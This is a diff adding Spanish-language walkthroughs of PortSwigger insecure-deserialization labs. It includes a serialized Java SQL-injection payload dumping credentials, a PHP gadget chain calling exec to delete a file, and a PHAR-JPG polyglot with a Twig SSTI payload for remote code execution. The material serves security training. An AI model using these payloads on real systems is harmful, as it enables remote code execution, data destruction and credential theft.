@@ -279,3 +279,125 @@ De salida obtendremos la sentencia SQL serializada para poder cambiarla por nues
 Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAeScgdW5pb24gc2VsZWN0IE5VTEwsTlVMTCxOVUxMLGNhc3Qoc3RyaW5nX2FnZyh1c2VybmFtZXx8JzonfHxwYXNzd29yZCwnLCcpIGFzIG51bWVyaWMpLE5VTEwsTlVMTCxOVUxMLE5VTEwgZnJvbSB1c2Vycy0tIC0=
 Deserialized object ID: ' union select NULL,NULL,NULL,cast(string_agg(username||':'||password,',') as numeric),NULL,NULL,NULL,NULL from users-- -
 ```
+
+## Reto 9: Desarrollo de una cadena de gadgets personalizada para la deserialización de PHP
+
+Este laboratorio utiliza un mecanismo de sesión basado en serialización. Al implementar una cadena de gadgets personalizada, se puede aprovechar su deserialización insegura para lograr la ejecución remota de código. Para resolver el laboratorio, elimine el morale.txtarchivo del directorio de inicio de Carlos.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+Accedemos al archivo ‘CustomTemplate.php‘ usando su versión de respaldo ‘.php~‘ y analizamos el flujo de ejecución del método mágico ‘__wakeup()‘.
+
+Vemos cómo este método instancia un objeto ‘Product‘ usando dos atributos: ‘default_desc_type‘ y ‘desc‘. A su vez, ‘desc‘ puede contener un objeto DefaultMap, que implementa ‘__get()‘ con una llamada a ‘call_user_func()‘ que nos permite ejecutar funciones arbitrarias.
+
+Combinando estos comportamientos, identificamos una cadena de gadgets que nos permite ejecutar comandos del sistema, como ‘rm /home/carlos/morale.txt‘, simplemente al deserializar un objeto bien construido.
+
+Creamos manualmente un objeto CustomTemplate que contiene la cadena de gadgets necesaria. En este objeto, el atributo ‘desc‘ contiene una instancia de DefaultMap cuyo callback es la función exec. Al deserializarlo, ‘exec()‘ se invocará con el valor de ‘default_desc_type‘, que contiene nuestro comando malicioso.
+
+Codificamos el objeto en Base64 y lo URL-encodeamos, luego lo inyectamos en la cookie de sesión. Al procesarse, se ejecuta el comando, lo que elimina el archivo ‘morale.txt‘ del directorio de Carlos y resuelve el laboratorio.
+
+```php
+<?php
+
+class CustomTemplate {
+    public $default_desc_type;
+    public $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this->desc = new Description();
+        $this->default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this->build_product();
+    }
+
+    public function __sleep() {
+        return ["default_desc_type", "desc"];
+    }
+
+    public function __wakeup() {
+        $this->build_product();
+    }
+
+    public function build_product() {
+        $this->product = new Product($this->default_desc_type, $this->desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc->$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
+        $this->TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    public $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this->callback, $name);
+    }
+}
+
+$obj = new CustomTemplate();
+$obj -> desc = new DefaultMap("exec");
+$obj -> default_desc_type="rm /home/carlos/morale.txt";
+echo serialize($obj);
+
+
+?>
+
+```
+## Reto 10:Uso de la deserialización de PHAR para implementar una cadena de gadgets personalizada
+
+Este laboratorio no utiliza explícitamente la deserialización. Sin embargo, si se combina PHAR Deserialización con otras técnicas de piratería avanzadas, aún puede lograr ejecución remota de código a través de una cadena de gadgets personalizada.
+
+Para resolver el laboratorio, elimine el morale.txtarchivo del directorio de inicio de Carlos.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter 
+
+Accedemos al contenido de ‘Blog.php~‘ y ‘CustomTemplate.php~‘, donde descubrimos una combinación peligrosa: CustomTemplate contiene un atributo ‘template_file_path‘ que apunta a un objeto Blog, y Blog tiene un atributo ‘desc‘ que se interpreta mediante el motor de plantillas Twig.
+
+Además, el atributo lockFilePath se pasa a ‘file_exists()‘, lo cual es un vector común para disparar la deserialización PHAR. Esto nos permite preparar un objeto con un payload SSTI (Server-Side Template Injection) que se ejecutará al ser interpretado por Twig, combinando ambas técnicas para lograr RCE.
+
+Construimos en PHP un objeto CustomTemplate que contiene un Blog como plantilla, y en su atributo ‘desc‘ insertamos un payload Twig que aprovecha la función ‘registerUndefinedFilterCallback()‘ para ejecutar ‘rm /home/carlos/morale.txt‘.
+
+Empaquetamos este objeto dentro de un archivo PHAR, y lo convertimos en un JPG válido para poder subirlo como avatar. Esto lo logramos creando un polyglot (PHAR-JPG) que funcione como imagen pero sea interpretado por PHP como un archivo PHAR cuando se accede con ‘phar://‘.
+
+Una vez subido el archivo avatar con el payload PHAR incrustado, realizamos una petición a ‘avatar.php‘ modificando el parámetro ‘avatar‘ para usar el protocolo ‘phar://‘.
+
+Esto hace que ‘file_exists()‘ evalúe el archivo como un objeto serializado, desencadenando la ejecución de nuestro payload Twig embebido, lo cual provoca que se ejecute el comando ‘rm /home/carlos/morale.txt‘, resolviendo así el laboratorio.
+
+```
+https://github.com/kunte0/phar-jpg-polyglot
+```
+Añadimos el código en `nano phar_jpg_polyglot.php` subimos el archivo out.jpg y en el enlace para ver la foto hacemos que el navegador lo interprete con el wrapper phar `https://0a53000a04742bb8806ab20500bf000c.web-security-academy.net/cgi-bin/avatar.php?avatar=phar://wiener`
+
+```php
+<?php
+	class Blog{}
+	class CustomTemplate{}
+	$blog = new Blog();
+	$blog->user="pwnd";
+	$blog->desc= '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+	
+	$obj = new CustomTemplate();
+	$obj -> template_file_path =$blog;
+?>
+
+```
